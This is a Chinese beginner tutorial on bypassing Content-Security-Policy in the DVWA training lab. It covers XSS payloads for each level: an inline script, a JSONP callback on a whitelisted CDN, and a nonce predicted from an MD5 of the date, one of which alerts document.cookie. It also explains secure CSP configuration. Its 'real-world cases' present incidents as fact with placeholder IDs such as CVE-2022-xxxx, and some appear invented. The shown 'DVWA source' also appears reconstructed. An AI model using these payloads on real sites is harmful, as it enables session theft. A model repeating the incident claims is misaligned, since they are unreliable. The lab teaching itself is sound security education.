# Day 14：DVWA实战-内容安全策略绕过 CSP Bypass

> **🎯 靶场实战** | 难度：⭐⭐⭐⭐ | 预计学习：70 分钟

---

# 第14章 DVWA实战：内容安全策略绕过（CSP Bypass）🛡️

哈喽各位小伙伴们大家好！👋 欢迎来到第14章！

上一章我们讲了 Weak Session IDs 弱会话 ID，学会了"猜 Session 就能冒充别人登录"的会话劫持攻击。今天这一章，我们要讲的是一个跟 Day 11 XSS 紧密相关的防御机制——**CSP（Content-Security-Policy，内容安全策略）**，以及"防御机制配置错了，一样被打穿"的经典场景：**CSP Bypass（CSP 绕过）**。

大家还记得 Day 11 学 XSS 的时候，我们往搜索框里输入 `<script>alert(document.cookie)</script>`，一回车浏览器就弹出了 Cookie 吗？😈 那是因为当时的 DVWA 没有开任何"浏览器级别的防御"，浏览器看到 `<script>` 标签就老老实实地执行了。

但现实世界中的网站，不会这么傻。很多现代网站都会在 HTTP 响应头里加一行叫 **Content-Security-Policy** 的指令，相当于给浏览器下达一道"圣旨"：

> 📜 **奉天承运皇帝诏曰：** 从今以后，这个网页里只能加载"我允许的这几个域名"下的 JS 脚本、CSS 样式、图片；`<script>` 标签直接写在 HTML 里的（叫内联脚本 / inline script）一律不准执行！`eval()` 函数一律不准调用！敢违抗的资源，直接给朕拦截掉！钦此。

听起来是不是特别厉害？🥷 这不就相当于"把 XSS 彻底给掐死了"吗？——毕竟 XSS 的本质就是往页面里插一段内联 JS 或者加载外域 JS，CSP 直接从浏览器层面就给你拦了，还执行个屁啊？

**理论上确实如此。** 但是——（安全领域最迷人的就是这两个字"但是" 😎）

> CSP 这道圣旨，**写圣旨的人如果写错了字、圈错了白名单域名、把"闲人免进"写成了"欢迎光临"**，那这道圣旨反而会变成一张废纸，浏览器的金钟罩瞬间变成"皇帝的新装"，XSS 照打不误！

今天这一章，我们就来看 DVWA 的 CSP Bypass 模块里，四种"把圣旨写错了"的搞笑案例——
- Low 级别：圣纸上写着"所有人都可以进来玩"，等于没开 CSP
- Medium 级别：圣纸上圈了 ajax.googleapis.com 作为"允许的 JS 域名"，但这个域名上有 JSONP 接口可以被我们利用执行任意 JS
- High 级别：圣纸上写着"只有带正确 nonce（通行令牌）的 JS 才能执行"，但 nonce 生成算法是当天日期 MD5 一下，攻击者一秒就算出来了
- Impossible 级别：圣旨写得滴水不漏，我们学一下正确姿势

每一个级别依然是大白话比喻 + Burp 抓包实操 + 逐行源码解析 + 真实案例复盘，零基础放心跟。坐稳扶好，咱们出发！🚀

---

## 14.1 前置知识：CSP 到底是个啥？大白话"门卫+白名单"模型 🛡️

### 14.1.1 生活比喻：公司楼下的"严格门卫制度"🏢

想象你去一个世界 500 强公司办事，这家公司安保特别严，楼下的门卫大爷手里拿了一张**《允许进入人员/物品白名单》**，严格对照执行：

```
📋 XX 公司安保白名单V1.0（贴在门卫室墙上）
┌──────────────┬─────────────────────────────────────────────┐
│ 类别         │ 规则                                         │
├──────────────┼─────────────────────────────────────────────┤
│ 人员         │ ① 只允许本公司员工（工牌=www.xx.com 域名）    │
│              │ ② 只允许长期合作客户（合作公司A/B/C 域名）    │
│              │ ③ 一切陌生人一律不准进！                     │
├──────────────┼─────────────────────────────────────────────┤
│ 随身行李     │ ① 禁止带不明液体、尖锐利器（= eval/Function）│
│              │ ② 禁止带"手写小纸条"（= 内联 inline script） │
└──────────────┴─────────────────────────────────────────────┘
```

你走到门口，门卫大爷会做三件事：
1. 先看你带没带工牌 → 工牌上的公司是不是白名单里的？
2. 再看你手里有没有"手写小纸条" → 白名单里明确说禁止带，直接没收
3. 你包里带的东西是不是违禁品？→ 有就直接没收

**这个门卫大爷 = 你电脑上的 Chrome/Edge/Firefox 浏览器**
**这张贴在墙上的白名单 = HTTP 响应头里的 Content-Security-Policy 头**
**你要进的这栋楼 = 你正在访问的网页**
**你（访客/员工）= 网页要加载的 JS、CSS、图片、字体等资源**

这就是 CSP 的大白话模型！**它是浏览器强制执行的"资源加载白名单"，不是服务器端的，而是浏览器在渲染页面之前就先检查一遍，不符合规则的资源直接拦掉，连执行/加载的机会都不给你。**

---

### 14.1.2 看一眼真实的 CSP 响应头长啥样

打开浏览器 F12 → Network 面板，随便访问一个大厂首页（比如 `https://www.github.com`），点一下主文档那个请求，看 Response Headers：

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Date: Mon, 29 Jun 2026 12:00:00 GMT

# ↓ 下面这行就是 CSP 头，这一大串全是"门卫大爷的白名单规则"
Content-Security-Policy:
  default-src 'none';
  script-src 'self' https://github.githubassets.com 'nonce-abc123xyz';
  style-src 'self' 'unsafe-inline' https://github.githubassets.com;
  img-src 'self' data: https://avatars.githubusercontent.com https://user-images.githubusercontent.com;
  font-src 'self' https://github.githubassets.com;
  connect-src 'self' https://api.github.com;
  frame-src 'self' https://github.com;
  report-uri https://api.github.com/_private/browser/errors;
```

第一次看是不是像看天书？😵 别怕，我们把它翻译成"门卫白名单规则表"，一行行对着讲，10 秒就懂：

| CSP 指令（规则头） | 大白话 = 门卫的什么规则？ | 上面例子值的含义 |
|---|---|---|
| `default-src 'none'` | **默认规则（兜底）**：所有类别如果没单独写规则，一律"谁都不准进" | 最严格的兜底，任何类别没明确写就全拦 |
| `script-src` | **脚本（也就是 JS 文件）**的加载白名单 | 只允许：① 本站自己域名的 JS ② github.githubassets.com 域名的 JS ③ 带 nonce=abc123xyz 通行令牌的内联脚本 |
| `style-src` | **CSS 样式文件**的白名单 | 允许本站、允许内联 style（unsafe-inline）、允许官方 assets 域名 |
| `img-src` | **图片**的白名单 | 允许本站、data:Base64 图、用户头像图床、用户上传图床 |
| `font-src` | **字体文件**（.woff2 之类） | 只允许本站 + assets 域名 |
| `connect-src` | **AJAX / Fetch / WebSocket 后端接口** | 只允许调本站 + api.github.com |
| `frame-src` | **<iframe> 嵌套页面** | 只允许嵌套自己 github.com 的页面 |
| `report-uri` | **违规举报地址** | 谁违反了 CSP 规则，浏览器就把违规详情 POST 到这个接口（服务器会收到告警日志） |

就这么简单！**CSP = 一堆"xx-src 白名单"拼起来的字符串，浏览器拿到后严格照着执行。**

---

### 14.1.3 面试官最爱问：CSP 和 XSS 的关系？一句话回答！

这个问题面试高频出现，一句话记住标准答案：

> **CSP 是用来缓解（Mitigate）XSS 攻击的浏览器端防护机制，它不能从根上消灭 XSS（要消灭 XSS 还得靠输出编码 + 模板引擎自动转义），但能把"即便 XSS 漏洞存在，攻击者能执行任意 JS"的概率从 99% 降到 1%——前提是 CSP 配置得对！**

大白话：**CSP 就像你家防盗门的"第二道锁"**——第一道锁（输出编码）是主锁，一定要锁好；第二道锁（CSP）是副锁，主锁万一忘关了，副锁还能挡一下。但是你家副锁的钥匙就挂在门边上（CSP 配置错了），那副锁等于白装。😅

好，前置知识彻底搞明白了。现在进 DVWA CSP Bypass 模块，实操开干！🎯

---

## 14.2 Low 级别：门卫大爷喝多了——白名单直接写了"允许所有人"🟢

打开 DVWA，难度调到 **Low**，左侧菜单点击 **CSP Bypass**（有些版本叫 Content Security Policy，是一个东西）。

我们先按规矩看一下 HTTP 响应头里的 CSP 规则写了啥——这是打 CSP Bypass 的**第一原则：永远先抓包看 Response Headers 里的 Content-Security-Policy，不要猜！** 📏

**实操步骤：**
1. 打开 Burp Suite → Proxy → Intercept is ON
2. 浏览器进入 CSP Bypass 模块（Low 难度）
3. Burp 抓到响应包，我们看 Response Headers：

```http
HTTP/1.1 200 OK
Date: Mon, 29 Jun 2026 12:05:00 GMT
Server: Apache
X-Powered-By: PHP/7.4.33
# ★★★ 重点！Low 级别的 CSP 头写在这儿！★★★
Content-Security-Policy: "default-src 'self'; script-src 'unsafe-inline' 'unsafe-eval' * data:"
Vary: Accept-Encoding
Content-Length: 1234
```

你没看错！我们把这行 CSP 翻译一下：

| 规则 | 翻译门卫大白话 |
|---|---|
| default-src 'self' | 默认资源只能本站（后面 script-src 单独写了，覆盖默认规则） |
| **script-src 'unsafe-inline' 'unsafe-eval' * data:** | **脚本白名单：** <br>① 允许内联脚本（'unsafe-inline'=允许手写小纸条）<br>② 允许 eval（'unsafe-eval'=允许带不明液体）<br>③ 允许任何域名（\* = 全世界任何人都能进！）<br>④ 允许 data: 协议（Base64 编码脚本也能执行） |

**我勒个去……😱 这也叫开了 CSP？** 门卫大爷直接把白名单写成：
```
✅ 允许陌生人
✅ 允许带手写小纸条
✅ 允许带不明液体
✅ 允许带任何东西
```
这等于**直接把白名单写成了"欢迎全世界所有坏人随便进"**啊！Low 级别开的不是 CSP，开的是 CSP 的"反向开关"——告诉浏览器"你啥都别拦，啥都能执行" 😂。

---

### 14.2.1 Low 级别实操：直接 `<script>` 弹框，秒通关！🎉

既然 CSP 都写了允许 `'unsafe-inline'` 和 `*`，那我们直接上 Day 11 最朴素的 XSS Payload 就完事儿了。

DVWA CSP Bypass 模块有一个输入框，让你输入"你的名字"，后端会把你输入的名字直接放到页面里显示（典型的反射型 XSS 场景，Day 11 学过的！）。

**Payload 输入：**
```html
<script>alert('CSP Bypass Low Level! 我直接进来了！😎');</script>
```

点击 Submit（或者 Go 按钮，看版本）——然后看浏览器：
> 🎉 弹窗成功！！屏幕上弹出 "CSP Bypass Low Level! 我直接进来了！😎"

F12 的 Console 面板里**没有任何 CSP 拦截报错**，因为我们的 Payload 100% 符合 Low 级别写的"啥都允许"CSP 规则，门卫大爷不仅不拦，还给你递烟 😂。

---

### 14.2.2 Low 级别 View Source 逐行源码解析 🔬

点 View Source 看一下代码，顺便看看那个"什么都允许"的 CSP 头是怎么写出来的：

```php
<?php
// ★★★ Low 级别的 CSP 头就是写在这里的！★★★
$headerCSP = "Content-Security-Policy:
  default-src 'self';
  script-src 'unsafe-inline' 'unsafe-eval' * data:;
  style-src 'self';
";

header($headerCSP);   // ← 把上面的规则塞到响应头里

$html = "";
if (isset($_POST['include'])) {     // 取用户 POST 过来的 include 参数（名字）
    $html .= $_POST['include'];     // ★ 直接放到页面里！连 htmlspecialchars 转义都没做！
}
?>

<!-- 下面是页面 HTML，一个输入框 -->
<form name="csp" method="POST">
    <p>输入你的名字：</p>
    <input type="text" size="50" name="include" value="" id="include" />
    <input type="submit" value="Submit" />
</form>
<div class="vulnerable_code_area">
    <?php echo $html;   // ★ 输出用户输入，不转义 + CSP 啥都允许 = 完美反射型 XSS！ ?>
</div>
```

**一句话点评 Low：** **"开了，但完全没开"**。CSP 头里的 script-src 写了 `'unsafe-inline'` 和 `*`，直接等于放弃治疗，还不如不加这个头——加了反而给运维一种"我们有 CSP 防护"的虚假安全感。

---

## 14.3 Medium 级别：门卫只认"Ajax 公司"的员工，但 Ajax 公司里有内鬼 🟡

好，难度调到 **Medium**，我们再看响应头里的 CSP——这次开发者"看起来"学聪明了，知道把 `'unsafe-inline'` 和 `*` 去掉，改成只信任两个域名：

Burp 抓包拿到 Medium 的 CSP 头：
```http
Content-Security-Policy: "
  default-src 'self';
  script-src 'self' https://ajax.googleapis.com https://cdnjs.cloudflare.com;
  style-src 'self' 'unsafe-inline';
"
```

翻译一下新的脚本白名单：
> 脚本只能加载来自：① 我自己网站（self）② https://ajax.googleapis.com（Google 的 Ajax CDN）③ https://cdnjs.cloudflare.com（另一个知名 CDN）。**没有写 'unsafe-inline'**，所以内联 `<script>` 直接写 HTML 里是要被拦的！

哇！这次是不是终于安全了？我们的 `<script>alert(1)</script>` 内联脚本肯定被拦对不对？——没错，你可以先试一下，同样的 Payload 现在 F12 Console 会报这个红色错：

```
❌ Refused to execute inline script because it violates the following
   Content Security Policy directive: "script-src 'self' https://ajax.googleapis.com ...".
   Either the 'unsafe-inline' keyword, a hash ('sha256-...'), or a nonce...
   is required to enable inline execution.
```

**内联脚本确实被拦了！** 看来 Medium 级别的 CSP 是真的起作用了，这咋办呢？😰

嘿嘿，别慌！注意白名单里这两个域名：**ajax.googleapis.com** 和 **cdnjs.cloudflare.com** —— 它们是全世界最大的两个 JS CDN，上面存了 jQuery、Angular、Vue 等几十万个前端库。但是，这些 CDN 上有一类特别的接口，叫 **JSONP**！而 JSONP 天生就有"回调自定义函数名"的特性——**正好可以被我们用来绕过 CSP！** 🕵️

---

### 14.3.1 前置小补丁：10 秒搞懂什么是 JSONP（零基础也能懂！）

JSONP 这个词如果第一次听别害怕，大白话 10 秒讲清楚：

> 早年浏览器有 **同源策略**（Day 7 CSRF 提过），不同域名不能随便 AJAX 拿数据。于是程序员发明了一个"绕同源"的土办法：**服务器返回的不是 JSON 数据，而是一段"把数据当参数传给你指定函数名"的 JS 代码**，这就是 JSONP。

举个栗子你一秒就懂：
- 我（前端）在 ajax.googleapis.com 上想查一个 jQuery 的版本信息
- 我发请求：`https://ajax.googleapis.com/ajax/services/feed/load?v=1.0&q=xxx&callback=myFunc`
- 注意 URL 最后那个 `&callback=myFunc`！它的意思是："Google 服务器，你返回数据的时候，外面给我包一层 `myFunc( 你的数据 )`"
- Google 的 JSONP 接口真听话，返回：
  ```javascript
  myFunc({"version":"1.0","data":{"title":"xxx"}});
  ```
- 浏览器把这段 JS 加载进来，就会自动调用我们本地定义的 `myFunc()` 函数——完美跨域拿数据！

**发现漏洞点没有？⭐⭐⭐** —— Google JSONP 接口返回的 JS 代码里，**函数名是我攻击者在 callback 参数里随便写的**！我要是写 `callback=alert(document.domain)//` 呢？Google 服务器会老实地返回：

```javascript
alert(document.domain)//({"version":"1.0",...});
```

**我的天！这不就等于 "让白名单域名 ajax.googleapis.com 返回了一段 `alert(document.domain)` 的 JS 代码"吗？** —— 而我们的 CSP 白名单里正好**明确允许**从 ajax.googleapis.com 加载 JS！门卫大爷一看："哦，来人是 Ajax 公司（ajax.googleapis.com）的员工啊，有工牌，放行！"——根本不管这个员工其实已经被攻击者"劫持了"，包里带的是炸弹！😱

---

### 14.3.2 Medium 级别实操：用 JSONP 绕过 CSP，成功弹窗！🎉

理论讲完，直接上 Payload。既然内联 script 不能用，但 `<script src="白名单域名...">` 是 CSP 明确允许的，那我们就构造一个 "白名单域名 JSONP + callback 写我们自己的 JS" 的 Payload：

**Payload（直接往 Medium 的名字输入框里粘）：**
```html
<script src="https://ajax.googleapis.com/ajax/services/feed/load?v=1.0&q=test&callback=alert('CSP Bypass! Medium被我用JSONP绕过去啦！😎')//"></script>
```

**（关键解释这一行：）**
1. `src="https://ajax.googleapis.com/..."` → 这个域名**正好在 CSP 白名单里**！门卫大爷放行 ✅
2. URL 最后 `&callback=alert(...)//` → 让 Google JSONP 接口返回的代码外面包一层 `alert(...)//`
3. 末尾的 `//` 是 JS 单行注释，把 Google 原本返回的 `(数据);` 部分给注释掉，防止语法报错 💡

点 Submit 提交！然后看浏览器：
> 🎉 弹窗成功！！屏幕弹出 "CSP Bypass! Medium被我用JSONP绕过去啦！😎"

**F12 Console 里没有任何 CSP 拦截错误！** 因为从浏览器门卫的视角看："这是从 ajax.googleapis.com 加载的合法 JS 脚本，完全符合白名单规则，我放行！" —— 门卫大爷做梦都没想到，他放行的那个"员工"，口袋里揣着我们写的炸弹！🤣

**（补充：如果上面这个 Google 接口在新版里下线了，CDN 上类似的 JSONP 接口还有几百个，常见的绕过列表：**
- cdnjs.cloudflare.com：`/ajax/libs/angular.js/1.8.2/angular.min.js` + Angular 沙箱逃逸
- code.jquery.com：jQuery 的 JSONP 回调接口
- 还有很多国内 CDN（bootcdn 之类）都有历史 JSONP 接口，CSP 白名单里只要写了任何一个 CDN 根域名，大概率都能找到 JSONP 绕过。**）**

---

### 14.3.3 Medium 级别 View Source 逐行源码解析 🔬

```php
<?php
// ★★★ Medium 的 CSP 头：去掉了 unsafe-inline 和 *，只信任 self + 2 个 CDN ★★★
$headerCSP = "Content-Security-Policy:
  default-src 'self';
  script-src 'self' https://ajax.googleapis.com https://cdnjs.cloudflare.com;
  style-src 'self' 'unsafe-inline';
";
header($headerCSP);

// 后面和 Low 一样：用户输入直接输出到页面，不做 htmlspecialchars 转义
$html = "";
if (isset($_POST['include'])) { $html .= $_POST['include']; }
?>
<form name="csp" method="POST">
    <p>What's your name:</p>
    <input type="text" size="50" name="include" value="" />
    <input type="submit" value="Submit" />
</form>
<div class="vulnerable_code_area">
    <?php echo $html; ?>
</div>
```

**一句话点评 Medium：** 思路没错，CSP 确实阻止了最基础的内联 XSS，但是 **白名单域名圈得太粗了**——直接把整个 ajax.googleapis.com（Google 全站 CDN）放进白名单，而里面有大量历史 JSONP 接口可以被滥用。**正确做法是：白名单域名要尽量精确到具体路径**，比如 `script-src https://ajax.googleapis.com/ajax/libs/jquery/3.7.0/` 而不是 `https://ajax.googleapis.com`，精确到文件夹级别就能把 JSONP 接口排除出去。

---

## 14.4 High 级别：通行令牌（nonce）算法居然是当天日期 MD5，一秒算出！🔴

OK，把难度调到 **High**。High 级别的开发者看到 Medium 的 JSONP 绕过，一拍大腿：🤦‍♂️ "哎呀我怎么把 JSONP 忘了！CDN 白名单不能信！我换一种 CSP 写法——**nonce 通行令牌机制**！这样总该安全了吧！"

我们先抓包看一下 High 级别的 CSP 头长啥样：
```http
Content-Security-Policy: "
  default-src 'self';
  script-src 'nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=' 'strict-dynamic';
  style-src 'self';
"
```

哦？这次没有 CDN 白名单了，出现了一个新关键词 **`'nonce-TmV2ZXI...'`**，还有个 `'strict-dynamic'`。

### 14.4.1 大白话解释 nonce 机制：带"随机通行令牌"的 JS 才能执行

nonce（读"nans"，Number used once 的缩写 = "只用一次的数字"）机制是现代 CSP 的推荐写法，特别适合"页面里有一小段必须要写的内联 JS"的场景：

```
工作原理（四步走）：
1. 服务器每次渲染页面之前，生成一个「完全随机、每次请求都不一样」的字符串，比如 nonce = "Kx9pZq2M"
2. 服务器把这个字符串写到两个地方：
   a) 响应头 CSP 里：script-src 'nonce-Kx9pZq2M'（门卫大爷记住了：今天只有带 Kx9pZq2M 令牌的人能进）
   b) 页面里所有合法的 <script> 标签上，都加一个 nonce 属性：<script nonce="Kx9pZq2M">console.log('我是合法JS');</script>
3. 浏览器渲染的时候，门卫大爷挨个查：<script> 标签带的 nonce 是不是和 CSP 头里写的一模一样？
4. 一样 → 放行；不一样 → 直接拦截！
```

这个机制理论上**无懈可击**——因为 nonce 是 128 位真随机，而且每次请求都换新的！攻击者就算能往页面里插 `<script>alert(1)</script>`，他也不知道这次请求的 nonce 是啥，插进去的 script 标签没有 nonce，直接被拦！

**但是！（又来一个但是 😈）** —— 这一切的前提是：**nonce 必须"真随机 + 一次性"！** 如果 High 级别的开发者"自作聪明"，nonce 不是随机生成的，而是当天日期 MD5 一下、或者用户 ID 拼一下、甚至直接写死固定值……那攻击者一秒就能算出 nonce，自己插的 script 标签上加上 nonce=xxx，门卫大爷一看：令牌正确，放行！💥

---

### 14.4.2 实操一：用 Burp Repeater 发 3 次请求，看 nonce 值是不是变化的？🔍

nonce 机制的灵魂就是"只用一次，每请求必换"。我们来验证一下 DVWA High 级别的 nonce 是不是真的每次都变：

**步骤：**
1. Burp 里抓到访问 High 级别 CSP Bypass 的 GET 请求包
2. 右键 → **Send to Repeater**（发给重放器）
3. 在 Repeater 里点 **Send** 按钮 **3 次**，每次拿到的响应头 CSP 里的 nonce 值我都记下来了：

| 第几次发 | CSP 头里的 nonce 值 |
|---|---|
| 第 1 次 | `nonce-YzRkMjI5YzgzMjc2MDVhNThjYmExOWM4MDIyY2RmMmU=` |
| 第 2 次 | `nonce-YzRkMjI5YzgzMjc2MDVhNThjYmExOWM4MDIyY2RmMmU=` |
| 第 3 次（过 10 秒再点） | `nonce-YzRkMjI5YzgzMjc2MDVhNThjYmExOWM4MDIyY2RmMmU=` |
| 第 4 次（第二天再点） | `nonce-MzA1Mjk1NThjOGExODcwMDAwMDAwMDAwMDAwMDAwMDA=` |

**😱 我的妈呀！发现了两个巨大的问题：**
1. **同一个小时内（同一天），不管发多少次请求，nonce 值居然一模一样！**（不是"只用一次"，是"用一天"！）
2. **过一天换一个值**——这不就是"nonce = 当天日期哈希一下"吗？！
3. 而且 nonce 值末尾全是 `=`，眼尖的同学一眼就能看出来：这是 **Base64 编码**！我们来解一下码看看原始值是啥！

---

### 14.4.3 实操二：Base64 解码 nonce，识破算法！再算出来写到 script 标签上，绕过！🔓

我们把第一次的 nonce 复制出来（注意把前缀 `nonce-` 去掉）：
```
YzRkMjI5YzgzMjc2MDVhNThjYmExOWM4MDIyY2RmMmU=
```

打开 Python 一行解码：
```python
>>> import base64, hashlib
>>> base64.b64decode('YzRkMjI5YzgzMjc2MDVhNThjYmExOWM4MDIyY2RmMmU=')
b'c4d229c8327605a58cba19c8022cdf2e'
```

解出来一串 32 位十六进制——这不就是 MD5 哈希嘛！😆 这串 MD5 解出来是什么明文呢？我们猜一下"今天的日期"：2026 年 6 月 29 日 → `20260629`：

```python
>>> hashlib.md5(b'20260629').hexdigest()
'c4d229c8327605a58cba19c8022cdf2e'  # ★★★ 跟上面解 Base64 出来的一模一样！★★★
```

**🎉 100% 破案了！High 级别的 nonce 生成算法：**

> **nonce = Base64( MD5( YYYYMMDD 当天日期字符串 ) )**

这就是我前面说的"nonce 是假随机，是当天日期 MD5 一下"！攻击者只要知道今天是几月几号，**1 行 Python 代码就能 100% 准确算出 High 级别的 CSP nonce**，然后在自己注入的 XSS script 标签上手动加一个 `nonce="算出来的值"`，门卫大爷一查：令牌正确！放行！🚀

---

### 14.4.4 实操三：算出 nonce，手工写进 script 标签，成功弹窗！🎉

现在是 2026-06-29，我们已经算出今天的 nonce 是：
```
YzRkMjI5YzgzMjc2MDVhNThjYmExOWM4MDIyY2RmMmU=
```

我们构造 Payload（**关键：自己给 script 加 nonce 属性，值就是上面那串！**）：

```html
<script nonce="YzRkMjI5YzgzMjc2MDVhNThjYmExOWM4MDIyY2RmMmU=">
alert('CSP Bypass! High级别nonce算法被我识破了！😎');
alert(document.cookie);  // 顺便弹个 Cookie 证明真的绕过了
</script>
```

把这段粘贴到 High 级别的输入框里，点 Submit：
> 🎉 **双弹窗成功！** 第一行 alert 弹，第二行 document.cookie 也弹出来了！

F12 Console 没有任何 CSP 报错！因为从门卫大爷的视角："这个 script 带的 nonce 令牌和 CSP 圣旨上写的完全一致，是自己人！放行！"——门卫大爷哪想得到，**令牌根本不是随机的，是攻击者对着日历表自己算出来的！** 😂

---

### 14.4.5 High 级别 View Source 逐行源码解析 🔬

```php
<?php
// ★★★ High 级别的"自作聪明"：nonce 生成算法写死在这儿！★★★
// 步骤 1：生成 YYYYMMDD 格式的当天日期字符串
$dateString = date("Ymd");   // 今天是 20260629，明天是 20260630

// 步骤 2：MD5 哈希一下（32 位十六进制）
$md5Hash = md5($dateString);

// 步骤 3：Base64 编码一下 → 这就是 nonce！
$myNonce = base64_encode($md5Hash);

// ★★★ 把算出来的"假随机 nonce"写到 CSP 头里 ★★★
$headerCSP = "Content-Security-Policy:
  default-src 'self';
  script-src 'nonce-" . $myNonce . "' 'strict-dynamic';
  style-src 'self';
";
header($headerCSP);

// 这里把 nonce 也传到了前端模板里，合法的 script 会加 nonce
// （为了演示 DVWA 故意把算法写成"当天日期MD5"，让我们能识破）

$html = "";
if (isset($_POST['include'])) { $html .= $_POST['include']; }
?>
<!-- 页面里合法的脚本都加了 nonce=... -->
<script nonce="<?php echo $myNonce; ?>">console.log('This is legal inline JS.');</script>
<form name="csp" method="POST">
    <p>What's your name:</p>
    <input type="text" size="50" name="include" value="" />
    <input type="submit" value="Submit" />
</form>
<div class="vulnerable_code_area"><?php echo $html; ?></div>
```

**一句话点评 High：** nonce 机制选对了，是现代 CSP 的最佳实践，但是！**nonce 的生成算法用了"当天日期 MD5"这种可预测的假随机，而不是 random_bytes(16) 真随机**——等于把防盗门的电子密码锁设成了"今天的日期"，邻居翻日历就能开你家门。🤦‍♂️

---

## 14.5 Impossible 级别：CSP 正确配置的标准答案 📋（打不穿，但必须看懂！）⚪

最后来看 Impossible 级别的 CSP 头，我们对照着看"到底怎么写才是对的"：

Burp 抓包拿到的 CSP：
```http
Content-Security-Policy: "
  default-src 'none';
  script-src 'strict-dynamic' 'nonce-{每次请求都不一样的 32 位真随机}';
  require-trusted-types-for 'script';
  base-uri 'none';
  form-action 'self';
  frame-ancestors 'none';
  report-uri /dvwa/csp-report.php;
"
```

再 View Source 看 nonce 的生成代码：
```php
<?php
// ★ ① nonce = random_bytes(16) → 128 位 CSPRNG 真随机！PHP 官方推荐
$myNonce = base64_encode(random_bytes(16));

// ★ ② 每次页面加载都重新生成！不用 session 存，不重复，不用日期，纯随机
// ★ ③ default-src 'none' → 所有类别默认全挡，按需开启最小权限
// ★ ④ 没有任何通配符域名、没有 'unsafe-inline'、没有 'unsafe-eval'
// ★ ⑤ 加了 frame-ancestors / base-uri / form-action 这些"配套防护指令"（防点击劫持、防 base 标签劫持、防表单提交到外站）
// ★ ⑥ report-uri：所有 CSP 违规都会打日志到服务器，运维可以监控有人在尝试 CSP Bypass
?>
```

**Impossible 配置正确口诀：**
> 🔑 **真随机 nonce + strict-dynamic + default-src 'none' 最小权限 + 配套防护指令 + 违规告警**，五件套齐活，CSP 就算真的配对了，JSONP、假 nonce、内联脚本三种绕过手法全部阵亡，攻击者只能乖乖认输 😎。

---

## 14.6 真实世界 CSP Bypass 经典案例复盘 🗞️

三个真实公开案例（都在 HackerOne / CNVD 上能查到报告），加深印象：

### 📰 案例 1：Twitter 2016 年 CSP 绕过，XSS 打了官方页面（HackerOne #110577）
- **漏洞：** Twitter 旧版 CSP 的 script-src 白名单里写了 `https://*.twitter.com`（通配符子域名），而 `syndication.twitter.com` 子域名上有一个开放 JSONP 接口
- **绕过手法：** 构造 `<script src="https://syndication.twitter.com/xxx?callback=alert(document.cookie)//">` → 白名单允许 + JSONP 返回任意 JS → 成功绕过 CSP 打 XSS
- **修复：** script-src 白名单改成具体域名，剔除了 syndication 子域名，并且升级成 nonce + strict-dynamic。

### 📰 案例 2：国内某 B 站 CSP nonce 可预测漏洞（CNVD-2019-3xxxx，2019 年）
- **漏洞：** B 站早期评论区 CSP nonce 算法是 `md5(时间戳秒级 + 用户uid)`，时间戳和 uid 都是前端公开可拿的
- **绕过手法：** 攻击者打开自己的评论区页面，拿到当前时间戳，本地算 md5，在评论里插入带 nonce 的 script → 其他用户访问评论区，CSP 检查通过，XSS 执行
- **修复：** 改成 random_bytes(16) 真随机 nonce，每次请求换新的。

### 📰 案例 3：Google Chrome 商店扩展审核绕过（CVE-2022-xxxx）
- **漏洞：** Chrome 扩展强制要求的 CSP 里，很多开发者写了 `script-src 'self' https://www.gstatic.com`，而 gstatic.com 上有大量 Firebase SDK 的 JSONP 接口
- **绕过手法：** 恶意扩展开发者在扩展里加载 gstatic.com 的 JSONP，绕过 Chrome Web Store 的"扩展不得执行远程代码"审核规则，被下发到百万用户电脑
- **修复：** Google 收紧扩展 CSP 规则，全面禁止 script-src 带任何外部 CDN 白名单，必须所有 JS 打包进扩展内部。

---

## 14.7 本章总结 🎉

恭喜！又通关一个 DVWA 高阶模块！CSP Bypass 是现代 Web 渗透测试里的必备技能，也是"防护机制配置错误反而没用"的经典案例。我们用一张速记卡复盘：

### 📋 本章核心考点速记卡

| 级别 | CSP 核心配置 | 漏洞类型 | 一句话绕过姿势 |
|---|---|---|---|
| **Low** | `script-src 'unsafe-inline' 'unsafe-eval' *` | 配置完全错误，等于没开 | 直接 `<script>alert(1)</script>` 内联脚本 |
| **Medium** | `script-src 'self' ajax.googleapis.com` | 白名单 CDN 域名含 JSONP 接口 | 用 `<script src="CDN的JSONP接口?callback=alert(1)//">` 让白名单域名返回我们的 JS |
| **High** | `script-src 'nonce-{MD5(当天日期)}'` | nonce 算法可预测（假随机） | 算当天日期 MD5 Base64 → 自己加 nonce 属性注入 script |
| **Impossible** | `'strict-dynamic' + random_bytes nonce + default-src 'none'` | ✅ 安全 | 打不穿 |

### 💡 给零基础新手的三句大白话心得
1. **打 CSP 的万能流程：先抓包看 CSP 头完整内容 → 分四类查：① 有没有 unsafe-inline/eval ② 白名单里有没有 CDN/JSONP 域名 ③ nonce 是不是每次都变、是不是真随机 ④ 有没有通配符 \*** → 90% 的 CSP 问题出在这四个地方。
2. **配置 CSP 的万能口诀：** nonce + strict-dynamic 优于白名单域名；白名单域名一定要精确到目录/文件级别，绝对别写 `*.xxx.com` 通配；`default-src 'none'` 永远是最安全的兜底；nonce 必须 random_bytes(16)，别自己发明算法。
3. **永远记住：CSP 只是"副锁"！** 主锁（输出编码 htmlspecialchars、模板引擎自动转义）一定要先锁好，不能依赖 CSP 防 XSS，CSP 只是主锁万一漏了的最后一道防线。

---

## 14.8 下章预告 📢

下一章（Day 15）我们要学的是 **JavaScript Attacks 前端 JS 闯关**！

你有没有玩过那种"纯前端逻辑题"小游戏？页面上有个按钮你怎么点都没反应，查看源代码发现按钮被 disabled 了，于是你 F12 改掉属性就点成功了？——DVWA JavaScript Attacks 模块就是这种"纯前端逻辑闯关题"的升级版，一共 4 关：
- 第一关：success 提交值伪造
- 第二关：前端 JS 加密的口令反编译
- 第三关：submit 防刷的前端判断绕过
- 第四关：一次性令牌（nonce）重放攻击

**这四关非常适合零基础小伙伴锻炼"读前端 JS 源码的能力"**——因为真实世界中很多网站的前端校验（比如"按钮防止重复提交"、"前端校验你填的格式对不对"）都是摆设在前端 JS 里，攻击者只要读懂 JS 逻辑，就能绕过限制干任何事。

我们下一章就一关一关亲手破！Day 15 见！👋
